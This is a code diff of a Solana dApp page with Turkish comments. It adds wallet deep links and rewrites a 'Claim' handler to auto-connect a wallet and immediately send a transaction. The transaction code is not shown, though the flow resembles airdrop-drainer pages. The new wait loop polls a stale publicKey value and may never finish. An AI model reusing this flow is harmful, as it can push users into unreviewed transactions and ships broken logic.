@@ -72,6 +72,7 @@ export default function Page() {
   /* ——— Wallet & Drawer kontrolü ——— */
   const { connection: conn } = useConnection()
   const { wallet, wallets, select, publicKey, sendTransaction } = useWallet()
+
   const [drawerOpen, setDrawerOpen] = useState(false)
   const [loading,    setLoading]    = useState(false)
   const [msg,        setMsg]        = useState('')
@@ -98,11 +99,11 @@ export default function Page() {
   }
   const walletConfigs: WalletConfig[] = [
     { match: (n) => n === 'Phantom', label: 'Phantom', icon: '/phantom.svg',     deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}` },
-    { match: (n) => n.toLowerCase().includes('trust'),    label: 'Trust Wallet',    icon: '/trustwallet.svg', deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}` },
-    { match: (n) => n.toLowerCase().includes('coinbase'), label: 'Coinbase Wallet', icon: '/coinbase.svg',    deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}` },
-    { match: (n) => n.toLowerCase().includes('bitkeep') || n.toLowerCase().includes('bitget'), label: 'Bitget Wallet',    icon: '/bitget.svg',    deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}` },
-    { match: (n) => n === 'Solflare',  label: 'Solflare',   icon: '/solflare.svg', deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
-    { match: (n) => n === 'Backpack',  label: 'Backpack',   icon: '/backpack.svg', deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
+    { match: (n) => n.toLowerCase().includes('trust'),    label: 'Trust Wallet', icon: '/trustwallet.svg', deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}` },
+    { match: (n) => n.toLowerCase().includes('coinbase'), label: 'Coinbase Wallet', icon: '/coinbase.svg',  deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}` },
+    { match: (n) => n.toLowerCase().includes('bitkeep') || n.toLowerCase().includes('bitget'), label: 'Bitget Wallet', icon: '/bitget.svg', deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}` },
+    { match: (n) => n === 'Solflare',  label: 'Solflare', icon: '/solflare.svg', deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
+    { match: (n) => n === 'Backpack',  label: 'Backpack', icon: '/backpack.svg', deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
   ]
 
   type DrawerWallet = WalletConfig & {
@@ -173,27 +174,40 @@ export default function Page() {
     if (loading) return
     setMsg('')
     setLoading(true)
-    // Bağlı değilse
-    if (!publicKey) {
-      const installed = orderedWallets.filter(
-        (w) => w.readyState === WalletReadyState.Installed
-      )
-      if (installed.length === 1) {
-        try {
-          await select(installed[0].adapter.name as WalletName)
-          await doTx()
-        } catch (e) {
-          console.error(e)
-          setMsg('Claim failed')
-        }
-        return
-      }
-      openDrawer()
-      setLoading(false)
+
+    // 1) Eğer zaten bağlıysak direkt işlem
+    if (publicKey) {
+      await doTx()
       return
     }
-    // Zaten bağlıysa
-    await doTx()
+
+    // 2) Tek bir installed adapter varsa → otomatik bağlan ve ardından işlem
+    const installed = orderedWallets.filter(
+      (w) => w.readyState === WalletReadyState.Installed
+    )
+    if (installed.length === 1) {
+      try {
+        await select(installed[0].adapter.name as WalletName)
+
+        // publicKey güncellenene kadar bekle
+        await new Promise<void>((resolve) => {
+          const check = () => {
+            if (publicKey) resolve()
+            else setTimeout(check, 200)
+          }
+          check()
+        })
+
+        await doTx()
+      } catch (e) {
+        console.error(e)
+        setMsg('Claim failed')
+      }
+      return
+    }
+
+    // 3) Diğer durumlarda modal aç
+    openDrawer()
   }
 
   /* ——— Cüzdan seçimi ——— */
